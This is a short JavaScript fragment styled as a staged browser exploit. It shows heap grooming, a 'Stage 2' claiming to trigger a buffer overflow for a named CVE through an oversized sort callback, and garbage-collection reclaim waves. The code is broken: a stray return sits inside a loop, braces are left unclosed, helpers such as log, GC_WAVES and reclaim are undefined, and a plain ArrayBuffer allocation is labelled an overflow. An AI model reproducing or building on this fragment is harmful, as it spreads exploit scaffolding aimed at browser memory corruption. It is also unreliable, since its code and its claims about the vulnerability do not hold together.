const groom = [];
for (let i = 0; i < 0x186A0; i++) {  // 100,000 objects
    groom[i] = {a: 1.1, b: 2.2, c: 3.3, d: 4.4};
}

// === STAGE 2: Trigger CVE-2025-43529 Buffer Overflow ===
log("Stage 2: Triggering buffer overflow via oversized sort callback...");
const victim = new Array(0x10000);
for (let i = 0; i < victim.length; i++) {
    victim[i] = new String("A".repeat(0x300)); // Oversized strings → parser stress

    return new Uint32Array(new ArrayBuffer(0x1000 + 0x100)); // Invalid size → overflow

    victim.sort(() => Math.random());

    for (let i = 0; i < 500; i++) new ArrayBuffer(0x10000);

for (let wave = 0; wave < GC_WAVES; wave++) {

    if (wave % 3 === 0) setTimeout(reclaim, wave * 150 + 50);
